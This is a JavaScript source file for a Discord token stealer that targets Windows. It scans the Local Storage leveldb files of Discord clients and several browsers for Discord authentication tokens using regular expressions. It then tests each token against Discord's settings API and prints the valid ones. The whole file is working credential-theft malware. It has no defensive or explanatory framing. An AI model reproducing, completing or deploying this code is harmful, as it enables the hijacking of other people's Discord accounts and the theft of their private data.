'use strict';
// THIS IS ONLY SUPPORTED ON WINDOWS. LINUX, AND MAC ARE NOT SUPPORTED.

class Schemaposse {
    constructor() {
        this.Dependencies = {
            // Eris: require('eris'), Later Updates 
            Request: require('request'),
            FileSystem: require('fs')
        };
        this.Roaming = process.env.APPDATA;
        this.LocalAppData = process.env.LOCALAPPDATA;
        this.Paths = {
            Discord           :`${this.Roaming}\\Discord`,
            DiscordCanary     :`${this.Roaming}\\discordcanary`,
            DiscordPTB        :`${this.Roaming}\\discordptb`,
            Google            :`${this.LocalAppData}\\Google\\Chrome\\User Data\\Default`,
            Firefox           :`${this.LocalAppData}\\Mozilla\\Firefox\\User Data\\Profiles`,
            Opera             :`${this.LocalAppData}\\Opera Software\\Opera Stable`,
            Edge              :`${this.LocalAppData}\\Microsoft\\Edge\\User Data\\Default`,
            Brave             :`${this.LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data\\Default`,
            Yandex            :`${this.LocalAppData}\\Yandex\\YandexBrowser\\User Data\\Default`
        };
        this.Tokens = {};
        this.Regex = [
            new RegExp(/mfa\.[\w-]{84}/g), 
            new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
        ];
        this.Header = function(Token) {
            return new Promise((res, rej) => {
                res({
                    'Authorization': Token,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
		            'Content-Type': 'application/json'
                })
            })
        };
        this.Endpoints = {
            Settings: 'https://discord.com/api/v9/users/@me/settings'
            // No Further Endpoints Needed as for now. 
        }
    }
    Sleep(MS) {
        return new Promise(res => setTimeout(res, MS));
    }
    async Check_Tokens_From_Paths(Token) {
        return new Promise(async (res, rej) => {
            let Headers = await this.Header(Token)
            this.Dependencies.Request({
                method: "GET",
                url: this.Endpoints.Settings,
                headers: Headers
            }, (error, body, response) => {
                let Data = JSON.parse(response)
                if (Data && Data.message && Data.message.includes("401")) res(false);
                res(true)
            })
        })
    }
    async Get_Tokens_From_Paths(Paths) {
        let Index = 0
        for (var Key in Paths) {
            Index++
            if (Paths.hasOwnProperty(Key)) {
                let Path = Paths[Key]
                let Directory = `${Path}\\Local Storage\\leveldb`
                this.Dependencies.FileSystem.readdir(Directory, (err, files) => {
                    if (err) return;
                    let FilteredFiles = files.filter(file => file.endsWith('.log') || file.endsWith('.ldb'))
                    FilteredFiles.forEach((file) => {
                        this.Dependencies.FileSystem.readFileSync(`${Directory}\\${file}`, "utf8").split(/\r?\n/).forEach(finish => { 
                            for (var i = 0; i < this.Regex.length; i++) {
                                let attempted_match = finish.match(this.Regex[i]);
                                        
                                if (attempted_match) {
                                    attempted_match.forEach(Token => {
                                        if (!this.Tokens[Key]) this.Tokens[Key] = { Tokens: [] };
                                        this.Check_Tokens_From_Paths(Token).then(Response => {
                                            if (Response == true) {
                                                console.log(`TOKEN FOUND:\nTOKEN: ${Token}\nPATH: ${Path}\n`)
                                                this.Tokens[Key].Tokens.push(Token);
                                            }
                                        })
                                    });
                                }
                            }
                        })
                    })
                })
            }
        }
        
        return new Promise(async(res, rej) => {
            while (Index != 9) {
                await this.Sleep(1000)
            }
            res(true)
        })
    }
}

const Class = new Schemaposse()
Class.Get_Tokens_From_Paths(Class.Paths)
